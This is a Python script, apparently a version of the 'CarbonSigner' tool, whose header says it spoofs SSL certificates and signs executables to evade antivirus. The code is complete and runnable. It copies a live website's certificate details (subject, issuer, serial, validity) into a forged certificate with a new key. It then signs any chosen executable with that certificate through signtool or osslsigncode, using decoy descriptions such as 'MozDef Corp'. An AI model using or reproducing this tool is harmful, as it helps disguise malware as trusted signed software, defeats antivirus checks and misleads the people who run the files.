#!/usr/bin/python3

## Author : Paranoid Ninja
## Email  : paranoidninja@protonmail.com
## Desc   : Spoofs SSL Certificates and Signs executables to evade Antivirus

import logging
from OpenSSL import crypto
from sys import argv, platform
from pathlib import Path
import shutil
import ssl
import subprocess
import os

# Set up logging
logging.basicConfig(level=logging.INFO)

# Constants
TIMESTAMP_URL = "http://sha256timestamp.ws.symantec.com/sha256/timestamp"

def create_pfx_with_openssl(cert_file, key_file, pfx_file):
    """Create a PFX file using the OpenSSL command line tool."""
    try:
        command = [
            "openssl", "pkcs12", "-export", "-out", str(pfx_file),
            "-inkey", str(key_file), "-in", str(cert_file)
        ]
        subprocess.check_call(command)
        return pfx_file
    except subprocess.CalledProcessError as e:
        logging.error(f"Error creating PFX file: {e}")
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
    return None

def CarbonCopy(host, port, signee, signed):
    try:
        # Fetching Details
        logging.info(f"Loading public key of {host} in memory...")
        ogcert = ssl.get_server_certificate((host, int(port)))
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)

        certDir = Path('certs')
        certDir.mkdir(exist_ok=True)

        # Creating Fake Certificate
        CNCRT   = certDir / (host + ".crt")
        CNKEY   = certDir / (host + ".key")
        PFXFILE = certDir / (host + ".pfx")

        # Generate new RSA private key with at least 2048 bits
        k = crypto.PKey()
        key_size = max(x509.get_pubkey().bits(), 2048)  # Ensure key size is at least 2048 bits
        k.generate_key(crypto.TYPE_RSA, key_size)

        # Cloning certificate details
        logging.info("Cloning Certificate Version...")
        cert = crypto.X509()
        cert.set_version(x509.get_version())
        cert.set_serial_number(x509.get_serial_number())
        cert.set_subject(x509.get_subject())
        cert.set_issuer(x509.get_issuer())
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')

        logging.info(f"Creating certificate and key files...")
        CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

        logging.info(f"Creating PFX file using OpenSSL...")
        pfxfile = create_pfx_with_openssl(CNCRT, CNKEY, PFXFILE)

        if not pfxfile:
            raise Exception("Failed to create PFX file.")

        if platform == "win32":
            logging.info(f"Platform is Windows OS...")
            logging.info(f"Signing {signed} with signtool.exe...")
            shutil.copy(signee, signed)
            subprocess.check_call(["signtool.exe", "sign", "/v", "/f", PFXFILE,
                "/d", "MozDef Corp", "/tr", TIMESTAMP_URL,
                "/td", "SHA256", "/fd", "SHA256", signed])
        else:
            logging.info(f"Platform is Linux OS...")
            logging.info(f"Signing {signee} with {PFXFILE} using osslsigncode...")
            args = ("osslsigncode", "sign", "-pkcs12", PFXFILE,
                    "-n", "Notepad Benchmark Util", "-i", TIMESTAMP_URL,
                    "-in", signee, "-out", signed)
            subprocess.check_call(args)

    except Exception as ex:
        logging.error(f"Something went wrong!\nException: {str(ex)}")

def main():
    logging.info(""" +-+-+-+-+-+-+-+-+-+-+-+-+
    |C|a|r|b|o|n|S|i|g|n|e|r|
    +-+-+-+-+-+-+-+-+-+-+-+-+
    
    CarbonSigner v1.0\n  Author: Paranoid Ninja\n""")

    if len(argv) != 5:
        logging.info("[+] Description: Impersonates the Certificate of a website")
        logging.info("[!] Usage: " + argv[0] + " <hostname> <port> <build-executable> <signed-executable>\n")
    else:
        CarbonCopy(argv[1], argv[2], argv[3], argv[4])

if __name__ == "__main__":
    main()
